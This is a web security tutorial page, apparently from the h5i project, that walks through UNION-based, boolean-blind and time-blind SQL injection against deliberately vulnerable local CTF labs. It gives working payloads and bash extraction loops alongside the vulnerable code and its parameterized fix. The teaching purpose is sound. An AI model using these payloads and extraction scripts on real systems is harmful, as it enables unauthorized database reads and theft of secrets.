@@ -1,0 +1,408 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SQL Injection | h5i web security tutorial</title><meta name="description" content="Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/sql-injection/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="SQL Injection | h5i web security tutorial"><meta property="og:description" content="Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time.">
+<meta property="og:url" content="https://h5i.dev/guides/sql-injection/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="SQL Injection | h5i web security tutorial">
+<meta name="twitter:description" content="Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "SQL Injection",
+      "description": "Turn a broken search query into a database read, then extract secrets when the application reveals only a boolean or only its response time.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-15",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/sql-injection/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "SQL Injection",
+          "item": "https://h5i.dev/guides/sql-injection/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 04 / Injection &middot; 2026-09-15</div>
+<h1>SQL Injection</h1><p class="post-deck">A beginner-friendly CTF tutorial: turn a broken search query into a database read, then extract secrets when the application reveals only a boolean—or only its response time.</p>
+<div class="post-meta"><span>11 min read</span><span>SQLi &middot; Boolean and timing oracles &middot; Labs 12&ndash;14</span></div></header>
+<p>In <a href="/guides/jwt-attacks/">JWT Attacks</a>, we modified authentication tokens and tested whether the server verified them correctly. In this article, we will follow user input across another trust boundary: from an HTTP request into a database query.</p>
+<p>Using Labs 12–14 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a>, we will learn three forms of SQL injection:</p>
+<ul>
+<li><strong>UNION-based SQL injection</strong>, where database rows appear in the response;</li>
+<li><strong>boolean-based blind SQL injection</strong>, where the application reveals one bit through <code>true</code> or <code>false</code>; and</li>
+<li><strong>time-based blind SQL injection</strong>, where the response body never changes but its timing does.</li>
+</ul>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to capture normal requests, change one query parameter, and measure differences in status, size, and response time.</p>
+<p>These are deliberately vulnerable local labs. SQL injection can expose or destroy real data, so only test systems you own or have explicit authorization to assess.</p>
+<h2 id="before-we-begin">Before we begin</h2>
+<p>You need Python 3.11 or later, h5i, and its <code>websec</code> plugin. The <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec#1-setup">tutorial README</a> contains the complete setup.</p>
+<pre><code class="language-bash">$ git clone https://github.com/h5i-dev/h5i-tutorial.git
+$ cd h5i-tutorial/websec
+$ h5i websec --help
+</code></pre>
+<h2 id="what-is-sql-injection">What is SQL injection?</h2>
+<p>Applications use SQL to read and modify relational databases. A safe query keeps its instructions separate from user-supplied values.</p>
+<p>For example:</p>
+<pre><code class="language-python">db.execute(
+    &quot;SELECT id, name, price FROM products WHERE name LIKE ?&quot;,
+    (f&quot;%{search}%&quot;,),
+)
+</code></pre>
+<p>The question mark is a parameter placeholder. The database treats <code>search</code> as data, even when it contains quotes or SQL keywords.</p>
+<p>A vulnerable application may instead construct the query as text:</p>
+<pre><code class="language-python">sql = (
+    &quot;SELECT id, name, price FROM products &quot;
+    f&quot;WHERE name LIKE '%{search}%'&quot;
+)
+</code></pre>
+<p>If <code>search</code> contains a quote, it can end the string literal and turn the remaining input into SQL syntax. This is <strong>SQL injection</strong>.</p>
+<h2 id="lab-12-make-the-database-print-another-table">Lab 12: make the database print another table</h2>
+<p>Start the catalogue lab:</p>
+<pre><code class="language-bash">$ ./run.sh 12
+</code></pre>
+<p>Open a normal product search:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9120/api/products?q=compass' \
+  --session lab12 --new --capture
+$ h5i websec show res_0 --session lab12 --raw
+</code></pre>
+<p>The response contains two products whose names include “compass.” Before trying a full payload, send one quote:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=compass'&quot;
+$ h5i websec show res_1 --session lab12 --raw
+</code></pre>
+<p>The application returns <code>500</code> and shows the query it attempted:</p>
+<pre><code class="language-json">{
+  &quot;error&quot;: &quot;unrecognized token: \&quot;'\&quot;&quot;,
+  &quot;sql&quot;: &quot;SELECT id, name, price FROM products WHERE name LIKE '%compass'%'&quot;
+}
+</code></pre>
+<p>Our quote ended the original string early. The final <code>%'</code> supplied by the application is now misplaced SQL syntax.</p>
+<p>A single error is a lead, not yet proof. A stronger test compares opposite conditions:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=compass%' AND '1'='1' -- &quot;
+
+$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=compass%' AND '1'='2' -- &quot;
+</code></pre>
+<p>If the first retains the original results and the second removes them, our input changed the query’s logic—not merely its syntax.</p>
+<h3 id="count-the-result-columns">Count the result columns</h3>
+<p>SQL’s <code>UNION</code> operator combines rows from two queries. Both sides must return the same number of columns in compatible positions.</p>
+<p>The normal response contains <code>id</code>, <code>name</code>, and <code>price</code>, suggesting three columns. We can verify that with <code>ORDER BY</code>:</p>
+<pre><code class="language-bash">$ for n in 1 2 3 4 5; do
+    printf '%s ' &quot;$n&quot;
+    h5i websec replay req_0 --session lab12 \
+      --reset-budget \
+      --set &quot;query.q=zz%' ORDER BY $n -- &quot; |
+      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;response&quot;][&quot;status&quot;])'
+  done
+</code></pre>
+<p>The result is:</p>
+<pre><code class="language-text">1 200
+2 200
+3 200
+4 500
+5 500
+</code></pre>
+<p>Ordering by the fourth column fails, so the original query returns three columns.</p>
+<h3 id="discover-the-table">Discover the table</h3>
+<p>This lab uses SQLite. SQLite stores information about tables in <code>sqlite_master</code>. Inject a second three-column query:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=zz%' UNION SELECT 1, name, 0 FROM sqlite_master WHERE type='table' -- &quot;
+</code></pre>
+<p>Note the <code>seq</code> from the replay output and inspect its <code>res_N</code>. The result lists both <code>products</code> and <code>api_keys</code>.</p>
+<p>The leading <code>zz%</code> makes the original product search return no rows. This keeps the output focused on rows introduced by our <code>UNION</code>.</p>
+<p>Now read the secret:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab12 \
+  --set &quot;query.q=zz%' UNION SELECT id, secret, 0 FROM api_keys -- &quot;
+</code></pre>
+<p>Inspect the new response. The injected row contains:</p>
+<pre><code class="language-text">FLAG{sqli_union}
+</code></pre>
+<p>The <code>--</code> at the end comments out the remaining quote and percent sign from the original query. Keeping a space after <code>--</code> also makes the payload compatible with SQL engines that require whitespace after the comment marker.</p>
+<h3 id="why-did-this-work">Why did this work?</h3>
+<p>The vulnerable handler directly inserts the search value into SQL:</p>
+<pre><code class="language-python">q = req.query.get(&quot;q&quot;, &quot;&quot;)
+sql = (
+    &quot;SELECT id, name, price FROM products &quot;
+    f&quot;WHERE name LIKE '%{q}%'&quot;
+)
+rows = db().execute(sql).fetchall()
+</code></pre>
+<p>The fix is parameterization:</p>
+<pre><code class="language-python">rows = db().execute(
+    &quot;SELECT id, name, price FROM products WHERE name LIKE ?&quot;,
+    (f&quot;%{q}%&quot;,),
+).fetchall()
+</code></pre>
+<p>Escaping individual dangerous characters is fragile. Parameterization prevents the value from becoming SQL syntax at all.</p>
+<h2 id="lab-13-extract-a-secret-through-a-boolean">Lab 13: extract a secret through a boolean</h2>
+<p>Lab 12 printed database rows in the response. Many applications do not.</p>
+<p>Start the waitlist lab:</p>
+<pre><code class="language-bash">$ ./run.sh 13
+</code></pre>
+<p>Its endpoint answers only whether an email address is on the list:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9130/api/check?email=ada@example.test' \
+  --session lab13 --new --capture
+$ h5i websec show res_0 --session lab13 --raw
+</code></pre>
+<pre><code class="language-json">{&quot;on_list&quot;: true}
+</code></pre>
+<p>When injection exists but the application does not directly print query results or database errors, it is called <strong>blind SQL injection</strong>.</p>
+<p>“Blind” does not mean that no information escapes. It means we need to identify a smaller signal and ask the database a series of questions.</p>
+<h3 id="establish-a-boolean-oracle">Establish a boolean oracle</h3>
+<p>An <strong>oracle</strong> is a behavior that answers a question about otherwise hidden data.</p>
+<p>Send two payloads that differ only in whether their predicate is true:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab13 \
+  --set &quot;query.email=zz' OR (1=1) -- &quot;
+
+$ h5i websec replay req_0 --session lab13 \
+  --set &quot;query.email=zz' OR (1=2) -- &quot;
+</code></pre>
+<p>The first response contains:</p>
+<pre><code class="language-json">{&quot;on_list&quot;: true}
+</code></pre>
+<p>The second contains:</p>
+<pre><code class="language-json">{&quot;on_list&quot;: false}
+</code></pre>
+<p>We can now replace <code>1=1</code> with a question about the hidden voucher code:</p>
+<pre><code class="language-sql">(SELECT unicode(substr(code,1,1)) FROM vouchers) &gt; 79
+</code></pre>
+<p>This asks whether the numeric value of the first character is greater than 79.</p>
+<h3 id="read-the-signal-without-fetching-every-body">Read the signal without fetching every body</h3>
+<p>The JSON response containing <code>true</code> is 17 bytes; the response containing <code>false</code> is 18. h5i includes the response size in the normal JSON output from <code>replay</code>, so a loop can branch on that number.</p>
+<p>Define a small function:</p>
+<pre><code class="language-bash">$ ask() {
+    h5i websec replay req_0 --session lab13 \
+      --reset-budget \
+      --set &quot;query.email=zz' OR ($1) -- &quot; |
+      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;response&quot;][&quot;bytes&quot;])'
+  }
+
+$ TRUE_BYTES=$(ask &quot;1=1&quot;)
+</code></pre>
+<p><code>--reset-budget</code> matters because extracting a secret requires many requests. Without it, the session’s bounded network allowance could stop the loop partway through and make the remaining answers look false.</p>
+<h3 id="binary-search-each-character">Binary-search each character</h3>
+<p>Trying every printable character could require dozens of questions per position. A binary search halves the remaining range after every answer and needs about seven questions for a printable ASCII character.</p>
+<p>The following loop first checks the secret’s length, then extracts each character:</p>
+<pre><code class="language-bash">$ OUT=&quot;&quot;
+
+$ for i in $(seq 1 64); do
+    if [ &quot;$(ask &quot;(SELECT length(code) FROM vouchers) &lt; $i&quot;)&quot; = &quot;$TRUE_BYTES&quot; ]; then
+      break
+    fi
+
+    LO=32
+    HI=126
+
+    while [ &quot;$LO&quot; -lt &quot;$HI&quot; ]; do
+      MID=$(( (LO + HI) / 2 ))
+
+      if [ &quot;$(ask &quot;(SELECT unicode(substr(code,$i,1)) FROM vouchers) &gt; $MID&quot;)&quot; = &quot;$TRUE_BYTES&quot; ]; then
+        LO=$((MID + 1))
+      else
+        HI=$MID
+      fi
+    done
+
+    OUT=&quot;$OUT$(printf &quot;\\$(printf '%03o' &quot;$LO&quot;)&quot;)&quot;
+    printf '\r%s' &quot;$OUT&quot;
+  done
+
+$ printf '\n%s\n' &quot;$OUT&quot;
+FLAG{sqli_blind_boolean}
+</code></pre>
+<p>Each request leaks only one yes-or-no answer. Together, those answers reconstruct the entire value.</p>
+<h3 id="why-did-this-work_1">Why did this work?</h3>
+<p>The endpoint builds another query through string concatenation:</p>
+<pre><code class="language-python">sql = f&quot;SELECT 1 FROM members WHERE email = '{email}'&quot;
+found = db().execute(sql).fetchone() is not None
+return js({&quot;on_list&quot;: found})
+</code></pre>
+<p>The application hides database rows and errors, but it exposes whether the query returned a row. Hiding output reduces the bandwidth of the vulnerability; it does not remove the vulnerability.</p>
+<p>The real fix is still a parameterized query. Rate limits and detection of hundreds of near-identical requests are useful additional defenses, but they do not make concatenated SQL safe.</p>
+<h2 id="lab-14-extract-a-secret-through-time">Lab 14: extract a secret through time</h2>
+<p>Lab 14 removes even the boolean. Start it:</p>
+<pre><code class="language-bash">$ ./run.sh 14
+</code></pre>
+<p>Open the coupon endpoint:</p>
+<pre><code class="language-bash">$ h5i browser open \
+  'http://127.0.0.1:9140/api/coupon?code=SPRING10' \
+  --session lab14 --new --capture
+</code></pre>
+<p>Whatever coupon we send, the response is always:</p>
+<pre><code class="language-json">{&quot;checked&quot;: true}
+</code></pre>
+<p>The status and body do not reveal whether the database condition was true. The server can still reveal one thing unintentionally: how long the query took.</p>
+<h3 id="build-a-timing-oracle">Build a timing oracle</h3>
+<p>The lab registers a SQLite function named <code>sleep</code>. Use it only when a predicate is true:</p>
+<pre><code class="language-sql">zz' OR (
+  SELECT CASE
+    WHEN (1=1) THEN sleep(0.4)
+    ELSE 0
+  END
+  FROM staff
+  WHERE name='admin'
+) --
+</code></pre>
+<p>Calibrate the difference with repeated samples:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab14 --repeat 5 \
+  --set &quot;query.code=zz' OR (SELECT CASE WHEN (1=1) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot;
+
+$ h5i websec replay req_0 --session lab14 --repeat 5 \
+  --set &quot;query.code=zz' OR (SELECT CASE WHEN (1=2) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot;
+</code></pre>
+<p><code>--repeat 5</code> reports every sample together with the median and median absolute deviation. These are more robust than relying on one request that may be delayed by unrelated system activity.</p>
+<p>For this local lab, a threshold of 250 milliseconds cleanly separates the normal and delayed responses.</p>
+<h3 id="extract-the-six-digit-pin">Extract the six-digit PIN</h3>
+<p>Define a function that returns one timing measurement:</p>
+<pre><code class="language-bash">$ ms() {
+    h5i websec replay req_0 --session lab14 \
+      --reset-budget \
+      --set &quot;query.code=zz' OR (SELECT CASE WHEN ($1) THEN sleep(0.4) ELSE 0 END FROM staff WHERE name='admin') -- &quot; |
+      python3 -c 'import json,sys; print(json.load(sys.stdin)[&quot;samples&quot;][0][&quot;total_ms&quot;])'
+  }
+</code></pre>
+<p>Network and scheduler noise can make a fast request look slow. A sleeping server cannot answer early. We therefore trust a fast result and confirm every slow result:</p>
+<pre><code class="language-bash">$ THRESHOLD=250
+
+$ truth() {
+    [ &quot;$(ms &quot;$1&quot;)&quot; -lt &quot;$THRESHOLD&quot; ] &amp;&amp; return 1
+    [ &quot;$(ms &quot;$1&quot;)&quot; -lt &quot;$THRESHOLD&quot; ] &amp;&amp; return 1
+    return 0
+  }
+</code></pre>
+<p>The PIN contains only digits, so search character codes 48 through 57 instead of the entire printable range:</p>
+<pre><code class="language-bash">$ PIN=&quot;&quot;
+
+$ for i in $(seq 1 6); do
+    LO=48
+    HI=57
+
+    while [ &quot;$LO&quot; -lt &quot;$HI&quot; ]; do
+      MID=$(( (LO + HI) / 2 ))
+
+      if truth &quot;unicode(substr(pin,$i,1)) &gt; $MID&quot;; then
+        LO=$((MID + 1))
+      else
+        HI=$MID
+      fi
+    done
+
+    PIN=&quot;$PIN$(printf &quot;\\$(printf '%03o' &quot;$LO&quot;)&quot;)&quot;
+    printf '\r%s' &quot;$PIN&quot;
+  done
+
+$ printf '\n'
+471902
+</code></pre>
+<p>Finally, send the recovered PIN to the vault:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab14 \
+  --set path=/api/vault \
+  --unset query.code \
+  --create --set &quot;query.pin=$PIN&quot;
+</code></pre>
+<p>The response contains:</p>
+<pre><code class="language-text">FLAG{sqli_blind_time}
+</code></pre>
+<h3 id="why-did-this-work_2">Why did this work?</h3>
+<p>The vulnerable query is still simple string concatenation:</p>
+<pre><code class="language-python">db().execute(
+    f&quot;SELECT 1 FROM coupons WHERE code = '{code}'&quot;
+).fetchone()
+
+return js({&quot;checked&quot;: True})
+</code></pre>
+<p>Returning a constant body and suppressing errors do not stop the injected expression from running. They only force the attacker to use a side channel.</p>
+<p>Different database engines expose different delay functions, such as <code>SLEEP</code> in MySQL and <code>pg_sleep</code> in PostgreSQL. Statement timeouts can reduce the channel’s reliability, but parameterization is what removes the injection.</p>
+<h2 id="a-reusable-sql-injection-workflow">A reusable SQL injection workflow</h2>
+<p>These labs form one progression:</p>
+<ol>
+<li>Send a quote and look for a change in status, body size, or error behavior.</li>
+<li>Confirm control over query logic with a true and a false predicate.</li>
+<li>If rows appear in the response, determine the column shape and test a <code>UNION</code>.</li>
+<li>If only two response states remain, turn them into a boolean oracle.</li>
+<li>If the response is constant, measure whether execution time forms an oracle.</li>
+<li>Use binary search and the smallest known character range to reduce requests.</li>
+<li>Confirm impact by retrieving a specific protected value.</li>
+</ol>
+<p>The important habit is to read each probe through three signals: <strong>status, size, and time</strong>. A response does not have to print an SQL error to tell you that something changed.</p>
+<h2 id="summary">Summary</h2>
+<p>Lab 12 let us place rows from <code>api_keys</code> into a product search response with <code>UNION</code>. Lab 13 exposed only a boolean, but that one bit per request was enough to reconstruct a voucher code. Lab 14 returned an entirely constant body, yet conditional delays revealed a six-digit PIN.</p>
+<p>All three vulnerabilities had the same root cause: user input was concatenated into SQL. Error suppression and constant responses changed the exploitation technique, not the underlying bug.</p>
+<p>When finished:</p>
+<pre><code class="language-bash">$ h5i browser close --session lab12
+$ h5i browser close --session lab13
+$ h5i browser close --session lab14
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/injection-beyond-sql/">Injection Beyond SQL</a>, we will continue beyond relational databases: NoSQL operator injection, shell command injection, server-side template injection, XXE, and second-order SQL injection.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial: Web application security</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/12-sqli-union">Lab 12: UNION SQL injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/13-sqli-blind-boolean">Lab 13: Boolean-based blind SQL injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/14-sqli-blind-time">Lab 14: Time-based blind SQL injection</a></li>
+</ul>
+
+<a class="next-up" href="/guides/injection-beyond-sql/"><span class="label">Next in the series</span><h3>Injection Beyond SQL</h3><p>The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
